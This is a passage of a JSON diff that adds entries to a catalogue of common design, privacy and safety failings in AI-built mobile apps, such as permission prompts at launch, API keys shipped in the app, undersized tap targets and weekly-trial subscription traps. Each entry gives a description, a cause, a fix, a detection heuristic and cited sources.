+  "theFix": "Put a visible Restore Purchases control on the paywall and in settings, call the platform restore API, and handle restoring, restored and nothing-to-restore states.",
+  "heur": "On every paywall screen, look for a control whose handler calls restorePurchases or the StoreKit restore API.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Restore Purchases Button Missing: The App Store Rejection Fix",
+    "u": "https://vp0.com/blogs/restore-purchases-button-missing-rejection-fix"
+   },
+   {
+    "t": "Common Mistakes When Building iOS Apps With AI",
+    "u": "https://vp0.com/blogs/common-mistakes-when-building-ios-apps-with-ai"
+   }
+  ],
+  "code": "A183",
+  "rel": [
+   "classic-plan-behind-cancel",
+   "the-weekly-trial-wrapper",
+   "test-mode-checkout"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "permission-for-the-picker",
+  "name": "Permission For The Picker",
+  "track": "behavioral",
+  "group": "Data & consent",
+  "category": "Mobile",
+  "harm": "Privacy",
+  "origin": "Training data",
+  "oneLiner": "The app asks for full photo library access just to let you pick one image.",
+  "looksLike": "Tap 'Upload photo' and a system prompt asks for access to all your photos before the picker opens. Deny it and the app refuses to show the picker at all.",
+  "why": "Older SDK examples requested media library permission before launching the picker, and models repeat that pattern. Expo's current docs say no permission is needed to launch the image library for images.",
+  "who": "Users hand over their whole library, or lose the feature by declining an unnecessary request.",
+  "theFix": "Launch the system image picker directly with no permission request. Only ask for library access if the app truly reads photos outside a picker.",
+  "heur": "Flag requestMediaLibraryPermissionsAsync immediately before launchImageLibraryAsync, or picker code that returns early when that permission is denied.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "ImagePicker - Expo documentation",
+    "u": "https://docs.expo.dev/versions/latest/sdk/imagepicker"
+   },
+   {
+    "t": "Do Lovable.dev apps pass App Store review?",
+    "u": "https://ptkd.com/journal/does-lovable-dev-apps-pass-app-store-review"
+   }
+  ],
+  "code": "B192",
+  "rel": [
+   "the-template-purpose-string",
+   "permission-wall-at-launch",
+   "no-way-to-delete-the-account"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "permission-wall-at-launch",
+  "name": "Permission Wall At Launch",
+  "track": "behavioral",
+  "group": "Data & consent",
+  "category": "Mobile",
+  "harm": "Consent",
+  "origin": "Model",
+  "oneLiner": "The app fires camera, location, contacts and notification prompts on first open, before showing any reason.",
+  "looksLike": "You install the app and before the first screen loads, iOS asks for notifications, then location, then photos. Some apps show a custom screen styled like the system alert with an arrow pointing at Allow.",
+  "why": "Generated code often requests every permission in the root component or app start hook because that is the simplest place to put it. Apple's guidance says to avoid asking at launch unless the app cannot work without it, and to wait until the user reaches the feature.",
+  "who": "Users either deny everything, breaking features later, or grant access they would not have given with context.",
+  "theFix": "Request each permission at the moment the user starts the feature that needs it, after a short in-app explanation with one Continue button. Never mimic the system alert.",
+  "heur": "Search the app entry and root layout for request*PermissionsAsync or requestAuthorization calls; any outside a user-triggered feature handler is a flag.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Accessing private data",
+    "u": "https://developer.apple.com/design/human-interface-guidelines/patterns/accessing-private-data"
+   },
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   }
+  ],
+  "code": "B193",
+  "rel": [
+   "the-template-purpose-string",
+   "permission-for-the-picker",
+   "no-way-to-delete-the-account"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "photos-sent-to-someone-else-s-ai",
+  "name": "Photos Sent To Someone Else's AI",
+  "track": "behavioral",
+  "group": "Data & consent",
+  "category": "Mobile",
+  "harm": "Privacy",
+  "origin": "Business",
+  "oneLiner": "The app sends your photos, chats or voice to a third-party AI provider without saying so or asking.",
+  "looksLike": "You scan a document or talk to the assistant, and nothing on screen mentions that the content goes to an outside model provider. The privacy label lists no third-party sharing.",
+  "why": "Calling a hosted model API is how most mobile AI features are built, and disclosure is an extra step. Apple's November 2025 update to rule 5.1.2(i) requires apps to disclose sharing personal data with third-party AI and get explicit permission first.",
+  "who": "Users share sensitive images and messages with companies they never heard of.",
+  "theFix": "Name the AI provider and what is sent at the moment of use, ask for explicit consent before the first upload, and match the privacy label.",
+  "heur": "Search client code for model API calls carrying images, audio or user text, and check a consent screen gates the first call.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Apple tightens App Review Guidelines to crack down on copycat apps",
+    "u": "https://9to5mac.com/2025/11/13/apple-tightens-app-review-guidelines-to-crack-down-on-copycat-apps/"
+   },
+   {
+    "t": "Does Apple Reject AI-Generated Apps? How to Get Approved | VP0 Journal",
+    "u": "https://vp0.com/blogs/does-apple-reject-ai-generated-apps"
+   }
+  ],
+  "code": "B194",
+  "rel": [
+   "the-template-purpose-string",
+   "no-way-to-delete-the-account",
+   "permission-for-the-picker"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "screenshots-of-another-app",
+  "name": "Screenshots Of Another App",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Mobile",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "App Store screenshots made with an AI generator show screens and features the app does not have.",
+  "looksLike": "Store frames show slick dashboards, charts and AI features. In the app, those screens do not exist, look different, or sit behind a paywall with no label.",
+  "why": "AI screenshot and mockup tools can invent UI from a prompt, which is faster than capturing real screens. Apple requires most screenshots to show the app in use and rejects screenshots that misrepresent the interface.",
+  "who": "Users install expecting features that are not there, and the listing can be rejected.",
+  "theFix": "Capture real screens from the submitted build and use AI only for framing, captions and backgrounds. Label premium features.",
+  "heur": "Walk through each store screenshot in the shipped build and confirm every screen and feature shown can be reached.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "2.3.3 - Show your app in use with screenshots",
+    "u": "https://developer.apple.com/help/app-review/guideline-reference/2-3-3-screenshots"
+   },
+   {
+    "t": "App Store Screenshots: Why Misleading Ones Get Rejected",
+    "u": "https://appscreenshotstudio.com/blog/app-store-screenshot-misleading-inaccurate-rejection-2026"
+   }
+  ],
+  "code": "A184",
+  "rel": [
+   "the-builder-s-watermark",
+   "morphing-b-roll",
+   "the-glowing-brain"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "tap-targets-sized-for-a-cursor",
+  "name": "Tap Targets Sized For A Cursor",
+  "track": "surface",
+  "group": "Accessibility",
+  "category": "Mobile",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "Icon buttons and close crosses sized for a mouse, under 44pt on iOS or 48dp on Android.",
+  "looksLike": "A 20px close X in the corner of a sheet, a row of tiny icon buttons in a header, text links packed in a line. Taps land on the wrong item or miss.",
+  "why": "AI builders start from web components and web density, where a mouse pointer can hit a 24px icon. The platform minimums differ, 44 by 44 points on iOS and 48 by 48 dp on Android, and generated code rarely applies either.",
+  "who": "People with larger fingers, tremors or one-handed grip miss controls and trigger the wrong action.",
+  "theFix": "Give every tappable element at least 44pt on iOS and 48dp on Android, using hitSlop or padding if the visible icon is smaller.",
+  "heur": "Measure the hit area of every Pressable and button in the rendered app; flag any below 44pt on iOS or 48dp on Android.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   },
+   {
+    "t": "How to Make an iOS App Look Native (2026)",
+    "u": "https://vp0.com/blogs/how-to-make-ios-app-look-native"
+   },
+   {
+    "t": "The AI-Built App Design Checklist: Six Passes That Catch It All",
+    "u": "https://vp0.com/blogs/ai-built-app-design-checklist"
+   }
+  ],
+  "code": "A185",
+  "rel": [
+   "frozen-type-size",
+   "the-rectangular-phone",
+   "nameless-icon-buttons"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-borrowed-brand-app",
+  "name": "The Borrowed Brand App",
+  "track": "surface",
+  "group": "Provenance",
+  "category": "Mobile",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "An AI app whose name, icon and screens imitate a famous AI product it has no tie to.",
+  "looksLike": "The store listing says 'Chat GBT' or 'AI Chat Bot' with a logo close to OpenAI's knot and screens copied from the real app. Some list the real model's name in the title to rank in search.",
+  "why": "Brand names drive store search, so clones put them in names and icons. Researchers found such clones in top charts, and Apple's November 2025 guideline 4.1(c) now bans using another developer's brand in an app's name or icon without approval.",
+  "who": "Users think they are using the official product and give data or money to an unknown developer.",
+  "theFix": "Name and brand the app as itself. If it uses a third-party model, say so in the description, not in the title or icon.",
+  "heur": "Check the app name, subtitle and icon for another company's product name or logo shapes.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Security Bite: Beware sketchy ChatGPT-clones slipping back into App Store charts",
+    "u": "https://9to5mac.com/2025/10/30/security-bite-beware-sketchy-chatgpt-clones-slipping-back-into-the-app-store-charts/"
+   },
+   {
+    "t": "Apple tightens App Review Guidelines to crack down on copycat apps",
+    "u": "https://9to5mac.com/2025/11/13/apple-tightens-app-review-guidelines-to-crack-down-on-copycat-apps/"
+   },
+   {
+    "t": "Does Apple Reject AI-Generated Apps? How to Get Approved | VP0 Journal",
+    "u": "https://vp0.com/blogs/does-apple-reject-ai-generated-apps"
+   }
+  ],
+  "code": "A186",
+  "rel": [
+   "tap-targets-sized-for-a-cursor",
+   "the-recoloured-template-app",
+   "the-rectangular-phone"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-broken-back-gesture",
+  "name": "The Broken Back Gesture",
+  "track": "behavioral",
+  "group": "Agency & control",
+  "category": "Navigation",
+  "harm": "Autonomy",
+  "origin": "Model",
+  "oneLiner": "Custom navigation or edge-to-edge carousels stop the system back swipe from working.",
+  "looksLike": "Swiping from the left edge on iOS does nothing, or scrolls a carousel instead of going back. On Android the back gesture closes the app or skips the confirmation the app tried to show.",
+  "why": "Generated apps often invent navigation instead of using the native stack, and place horizontal scrollers flush to the screen edge. Android's predictive back means old code that decides on back at the last moment no longer works.",
+  "who": "Users get stuck or lose their place, and people who rely on the back gesture cannot move through the app.",
+  "theFix": "Use the platform navigation stack, keep swipe-back enabled, inset edge carousels, and use ahead-of-time back handling such as PopScope or OnBackInvokedCallback.",
+  "heur": "Try the back gesture on every screen on both platforms, and search for gestureEnabled: false, onBackPressed or WillPopScope.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   },
+   {
+    "t": "How to Make an iOS App Look Native (2026)",
+    "u": "https://vp0.com/blogs/how-to-make-ios-app-look-native"
+   },
+   {
+    "t": "Android predictive back",
+    "u": "https://docs.flutter.dev/release/breaking-changes/android-predictive-back"
+   }
+  ],
+  "code": "B195",
+  "rel": [
+   "coming-soon-navigation",
+   "search-that-s-just-filter",
+   "filters-that-won-t-combine"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-crowded-tab-bar",
+  "name": "The Crowded Tab Bar",
+  "track": "surface",
+  "group": "Components",
+  "category": "Navigation",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "A tab bar with six or more tabs, or actions like Create or Ask AI mixed in.",
+  "looksLike": "Seven tiny icons share the bottom bar with labels cut off. A raised centre button opens a compose sheet or an AI chat, and behaves unlike the other tabs.",
+  "why": "Models add a tab for each feature listed in the prompt. Apple's guidelines say to use three to five tabs on iPhone and to use the tab bar only for navigation, not for actions.",
+  "who": "Labels become unreadable and targets too small, and users cannot predict what a tab will do.",
+  "theFix": "Keep three to five destinations, move extra sections inside them, and put actions such as Compose or Ask in a toolbar or on the relevant screen.",
+  "heur": "Count the tab navigator's screens and flag more than five, or any tab whose press opens a modal instead of a screen.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Tab bars | Apple Developer Documentation",
+    "u": "https://developer.apple.com/design/human-interface-guidelines/components/navigation-and-search/tab-bars"
+   },
+   {
+    "t": "iOS 18 Custom Tab Bar UI: Build It the Native Way",
+    "u": "https://vp0.com/blogs/ios-18-custom-tab-bar-ui-template"
+   }
+  ],
+  "code": "A187",
+  "rel": [
+   "shortcuts-nobody-wired",
+   "coming-soon-navigation",
+   "search-that-s-just-filter"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-edible-verdict",
+  "name": "The Edible Verdict",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Mobile",
+  "harm": "Safety",
+  "origin": "Model",
+  "oneLiner": "A photo ID app names a mushroom or plant with confidence, when a wrong answer can poison someone.",
+  "looksLike": "Point the camera at a mushroom and the app shows a species name and 'edible' with a percentage. There is no strong warning that photos alone cannot rule out toxic lookalikes.",
+  "why": "Image classifiers always return a top label, and apps present it as an answer. A study of three apps found the best identified only about half of 78 specimens, and deadly Amanita phalloides was called edible in some tests.",
+  "who": "Foragers, especially beginners and children, can be poisoned.",
+  "theFix": "Never show edibility from a photo. Show possible matches including toxic lookalikes, and tell users to confirm with a local expert.",
+  "heur": "Check whether any result screen labels a species as edible or safe based on a photo alone.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "A comparison of the accuracy of mushroom identification applications using digital photographs",
+    "u": "https://pubmed.ncbi.nlm.nih.gov/36794335/"
+   },
+   {
+    "t": "Relying on AI to Identify Mushrooms Could Kill You",
+    "u": "https://gizmodo.com/ai-mushroom-id-dangerous-consumer-advocates-warn-1851355484"
+   }
+  ],
+  "code": "A188",
+  "rel": [
+   "the-key-in-the-bundle",
+   "no-report-button-on-generated-content",
+   "frozen-type-size"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-hand-rolled-switch",
+  "name": "The Hand-Rolled Switch",
+  "track": "surface",
+  "group": "Components",
+  "category": "Mobile",
+  "harm": "Accessibility",
+  "origin": "Model",
+  "oneLiner": "Toggles, buttons and pickers rebuilt from styled views instead of using the platform controls.",
+  "looksLike": "A switch made of two rounded views that slides on tap, a dropdown that opens a web-style list, a custom date field. They look close to native but miss states, accessibility roles and expected behaviour.",
+  "why": "Models generate controls the way they would on the web, from divs and styles. Practitioners list custom buttons and switches that reimplement system controls with worse behaviour as a tell of AI-built apps.",
+  "who": "Screen reader users hear no role or state, and everyone loses the feel and gestures they expect.",
+  "theFix": "Use the platform Switch, pickers, menus and sheets, and style them within the platform's limits.",
+  "heur": "Search for Pressable or TouchableOpacity components that toggle a boolean with no accessibilityRole of switch or checkbox.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How to Make an AI-Generated App Look Native on iOS",
+    "u": "https://vp0.com/blogs/make-ai-app-look-native-ios"
+   },
+   {
+    "t": "The AI-Built App Design Checklist: Six Passes That Catch It All",
+    "u": "https://vp0.com/blogs/ai-built-app-design-checklist"
+   }
+  ],
+  "code": "A189",
+  "rel": [
+   "delete-button-in-every-row",
+   "google-only-sign-in",
+   "glass-over-content"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-key-in-the-bundle",
+  "name": "The Key In The Bundle",
+  "track": "behavioral",
+  "group": "Safety",
+  "category": "Mobile",
+  "harm": "Money",
+  "origin": "Prompting",
+  "oneLiner": "The AI feature calls OpenAI or another provider straight from the phone with a secret key in the app.",
+  "looksLike": "The code reads EXPO_PUBLIC_OPENAI_API_KEY or a key in app.json extra and sends requests directly to the model API. Anyone who unpacks the app can read the key and run up the bill.",
+  "why": "Calling the provider from the client is the shortest working demo, and builders paste keys where the AI tells them. EXPO_PUBLIC values and the app config ship in the binary in plain text, and OpenAI says never to deploy keys in mobile apps.",
+  "who": "The developer pays for strangers' usage, and users' requests may be exposed or abused.",
+  "theFix": "Move every model call behind your own backend or a serverless function that holds the key and enforces per-user limits, then rotate any key that ever shipped.",
+  "heur": "Search the bundle and config for sk-, EXPO_PUBLIC_*KEY, or provider hostnames like api.openai.com called from client code.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Best Practices for API Key Safety",
+    "u": "https://help.openai.com/en/articles/5112595-best-practices-for-api-key-safety"
+   },
+   {
+    "t": "Secrets & environment - Security - Mobile | TurboStarter",
+    "u": "https://www.turbostarter.dev/docs/mobile/security/secrets"
+   },
+   {
+    "t": "Does the Expo extra field in app.json leak secrets in production? | PTKD Journal",
+    "u": "https://ptkd.com/journal/expo-app-json-security-risks"
+   }
+  ],
+  "code": "B196",
+  "rel": [
+   "the-edible-verdict",
+   "no-report-button-on-generated-content",
+   "delete-button-in-every-row"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-link-that-opens-the-browser",
+  "name": "The Link That Opens The Browser",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Navigation",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Shared links and email links open the website instead of the installed app.",
+  "looksLike": "Tap a link to a post or a password reset email and Safari or Chrome opens, often to a page asking you to log in again. The app is installed but never opens.",
+  "why": "Generated apps declare deep links in code but miss the server files that verify them. iOS needs a valid apple-app-site-association file and Android needs assetlinks.json with the signing certificate fingerprint.",
+  "who": "Users bounce between browser and app, and flows such as sign-in links break.",
+  "theFix": "Host and validate apple-app-site-association and assetlinks.json on your domain, with the production signing certificate, and test links on real devices.",
+  "heur": "Fetch /.well-known/apple-app-site-association and /.well-known/assetlinks.json on the app's domain and check they return valid JSON with no redirects.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   }
+  ],
+  "code": "B197",
+  "rel": [
+   "coming-soon-navigation",
+   "the-link-column-footer",
+   "search-that-s-just-filter"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-map-everything-feed",
+  "name": "The Map-Everything Feed",
+  "track": "behavioral",
+  "group": "Motion & performance",
+  "category": "Mobile",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Long lists built by mapping every item inside a ScrollView instead of a virtualised list.",
+  "looksLike": "The feed or history screen renders fine with ten demo items. With a few hundred real items it stutters, eats memory and takes seconds to open.",
+  "why": "Mapping an array is the web habit, and it works with short demo data. React Native's docs say ScrollView renders all children at once, while FlatList renders lazily; generated code also often omits stable keys.",
+  "who": "Users on older phones get janky scrolling, slow screens and crashes as their data grows.",
+  "theFix": "Use FlatList, FlashList or LazyColumn with stable keys for any list that can grow, and test with hundreds of items.",
+  "heur": "Search for ScrollView whose child is an array .map() of data items.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "ScrollView · React Native",
+    "u": "https://reactnative.dev/docs/scrollview"
+   },
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   }
+  ],
+  "code": "B198",
+  "rel": [
+   "delete-button-in-every-row",
+   "the-hand-rolled-switch",
+   "fade-up-on-everything"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-recoloured-template-app",
+  "name": "The Recoloured Template App",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Mobile",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "One AI builder template shipped as many apps with only a new colour and icon.",
+  "looksLike": "The same onboarding, card layout, tab bar and paywall appear across unrelated apps. Only the accent colour and name change.",
+  "why": "Mobile AI builders start from the same templates and defaults, so prompts with little direction come back looking the same. Apple's spam rule 4.3 rejects near-identical apps, and practitioners name the recoloured template as a common failure.",
+  "who": "Users cannot tell apps apart, and the builder's app may be rejected as spam.",
+  "theFix": "Define the app's own purpose, palette, type and content before generating screens, and give the AI that system as the reference.",
+  "heur": "Compare the app's screens to the builder's starter template; if layout and components match with only colour changes, flag it.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Fix App Store Rejection 4.2 and 4.3 for AI-Built Apps",
+    "u": "https://vp0.com/blogs/app-store-rejection-spam-design-ai-fix"
+   },
+   {
+    "t": "How to Fix a Rork App Store Rejection (2026) | VP0 Journal",
+    "u": "https://vp0.com/blogs/how-to-fix-rork-app-store-rejection-2026"
+   }
+  ],
+  "code": "A190",
+  "rel": [
+   "glass-over-content",
+   "google-only-sign-in",
+   "the-template-purpose-string"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-rectangular-phone",
+  "name": "The Rectangular Phone",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Mobile",
+  "harm": "Accessibility",
+  "origin": "Model",
+  "oneLiner": "Generated screens assume a plain rectangle, so content hides under the notch, home indicator or Android system bars.",
+  "looksLike": "The screen title sits behind the camera housing. The tab bar or chat input bar sits under the home indicator or the Android navigation bar. Rows touch the rounded corners, and the code shows paddingTop: 44 or paddingBottom: 34 instead of real insets.",
+  "why": "Models write a fixed padding that looked right on one simulator instead of reading the device's safe-area insets. Android 15 made apps edge-to-edge by default, so content that ignores insets now draws behind the system bars too.",
+  "who": "Anyone on a different phone, in landscape, or on three-button Android navigation loses taps and text under system chrome.",
+  "theFix": "Wrap the app in a safe-area provider and use SafeAreaView with explicit edges or useSafeAreaInsets() for floating elements. Tell the AI: never hardcode notch or home-indicator padding; read insets.",
+  "heur": "Search for numeric paddingTop/paddingBottom of 20, 44, 47 or 34 on root views and for screens with no SafeAreaView or inset hook; then check on a notched iPhone and a three-button Android device.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Lovable iPhone Safe Area Fix: Read Insets, Not Constants",
+    "u": "https://vp0.com/blogs/lovable-safe-area-iphone-17-fix"
+   },
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   },
+   {
+    "t": "Handle edge-to-edge enforcements in Android 15",
+    "u": "https://developer.android.com/codelabs/edge-to-edge"
+   }
+  ],
+  "code": "A191",
+  "rel": [
+   "no-report-button-on-generated-content",
+   "tap-targets-sized-for-a-cursor",
+   "website-in-a-box"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-template-purpose-string",
+  "name": "The Template Purpose String",
+  "track": "surface",
+  "group": "Data & consent",
+  "category": "Mobile",
+  "harm": "Consent",
+  "origin": "Tool default",
+  "oneLiner": "iOS permission prompts that just say 'Allow MyApp to access your camera' with no reason.",
+  "looksLike": "The system alert reads 'Allow $(PRODUCT_NAME) to access your photos' or 'This app needs access to your location.' Nothing says which feature uses it or what happens to the data. Some apps also declare permissions no code path uses.",
+  "why": "Expo config plugins ship generic default messages, and builders rarely override them. Apple's review rule 5.1.1(ii) says a purpose string that only restates the resource does not meet the requirement.",
+  "who": "Users cannot make an informed choice, and the app risks rejection at review.",
+  "theFix": "Write one specific, active-voice sentence per resource that names the feature, for example 'Scans receipts you photograph to fill in the expense.' Remove permissions the app does not use.",
+  "heur": "Read Info.plist or app.json for NS*UsageDescription values; flag any that match the plugin default or contain only the resource name.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "5.1.1(ii) - Write clear purpose strings - Guideline reference - App Review - Help - Apple Developer",
+    "u": "https://developer.apple.com/help/app-review/guideline-reference/5-1-1-purpose-strings"
+   },
+   {
+    "t": "ImagePicker - Expo documentation",
+    "u": "https://docs.expo.dev/versions/latest/sdk/imagepicker"
+   },
+   {
+    "t": "Do Lovable.dev apps pass App Store review?",
+    "u": "https://ptkd.com/journal/does-lovable-dev-apps-pass-app-store-review"
+   }
+  ],
+  "code": "A192",
+  "rel": [
+   "permission-wall-at-launch",
+   "permission-for-the-picker",
+   "photos-sent-to-someone-else-s-ai"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-uncopyable-answer",
+  "name": "The Uncopyable Answer",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Conversation",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "In an AI chat app, the generated answer cannot be selected or copied.",
+  "looksLike": "Long-press a reply that contains an address, code or a recipe, and nothing happens. There is no copy button either, so users screenshot the text.",
+  "why": "React Native's Text component is not selectable by default, and generated chat bubbles render answers in plain Text without enabling selection or adding a copy action.",
+  "who": "Users cannot reuse the output they came for, and people using assistive tools cannot work with it.",
+  "theFix": "Set selectable on message text or use a selectable text component, and add a visible Copy action on each reply.",
+  "heur": "Search chat message components for Text without selectable and for no copy-to-clipboard handler.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Text · React Native",
+    "u": "https://reactnative.dev/docs/text"
+   }
+  ],
+  "code": "A193",
+  "rel": [
+   "scroll-hijacked-by-the-stream",
+   "you-re-absolutely-right",
+   "great-question-opener"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-weekly-trial-wrapper",
+  "name": "The Weekly Trial Wrapper",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "A thin chatbot app that wraps a free model and charges a weekly subscription after a three-day trial.",
+  "looksLike": "The app opens to a paywall with 'Start free trial' in large type and '$6.99/week' small. The free tier allows a few messages a day and fills the rest with ads. Deleting the app does not cancel the plan.",
+  "why": "Wrapping a model API is cheap, and weekly billing after a short trial earns more from people who forget to cancel. Security researchers documented AI chat apps charging around $6 to $7 a week for access the model maker offers free.",
+  "who": "Users pay hundreds a year for a free service, often without realising the trial converted.",
+  "theFix": "Show the full price and billing period as clearly as the trial, offer monthly or annual plans, and remind users before the trial converts.",
+  "heur": "Compare the visual weight of the trial button to the price text on the paywall, and check the price per week against what the underlying model costs directly.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Fake ChatGPT Apps Scam Users Out of Thousands of Dollars, Sophos Reports",
+    "u": "https://sophos.com/en-us/press/press-releases/2023/05/fake-chatgpt-apps-scam-sophos-reports"
+   },
+   {
+    "t": "ChatGPT Causes New Wave of Fleeceware",
+    "u": "https://blog.gridinsoft.com/chatgpt-fleeceware/"
+   }
+  ],
+  "code": "B199",
+  "rel": [
+   "classic-plan-behind-cancel",
+   "stacked-limit-windows",
+   "paywall-with-no-restore"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "website-in-a-box",
+  "name": "Website In A Box",
+  "track": "behavioral",
+  "group": "Layout",
+  "category": "Mobile",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "A web app from an AI site builder wrapped in a WebView shell and submitted as a native app.",
+  "looksLike": "The app is the live website inside a frame: web-style navigation, no offline screen, scroll that bounces like a browser, and permissions that only feed page JavaScript. Often the shell loads the live published URL.",
+  "why": "Web-first AI builders offer a quick wrapper path to the stores, and loading the live URL is the easiest setup even though Capacitor says that setting is not for production. Apple's minimum functionality rule 4.2 targets apps that add nothing beyond the website.",
+  "who": "Founders lose weeks to rejections, and users who do get the app receive a slower, worse website.",
+  "theFix": "Bundle the app files, add real native value such as push, share, camera or offline use, and use native navigation. Tell the AI to build native screens, not a wrapper.",
+  "heur": "Check the Capacitor or wrapper config for a remote server URL, and open the app in airplane mode to see whether anything works.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Lovable to the App Store: What the Wrapper Guides Don't Tell You",
+    "u": "https://foresightmobile.com/blog/lovable-to-app-store"
+   },
+   {
+    "t": "Do Lovable.dev apps pass App Store review?",
+    "u": "https://ptkd.com/journal/does-lovable-dev-apps-pass-app-store-review"
+   },
+   {
+    "t": "No-Code App Builders and App Store Review Guidelines | Superapp",
+    "u": "https://superapp.dev/blog/no-code-app-builder-app-store-approval.md"
+   }
+  ],
+  "code": "B200",
+  "rel": [
+   "the-rectangular-phone",
+   "delete-button-in-every-row",
+   "the-hand-rolled-switch"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
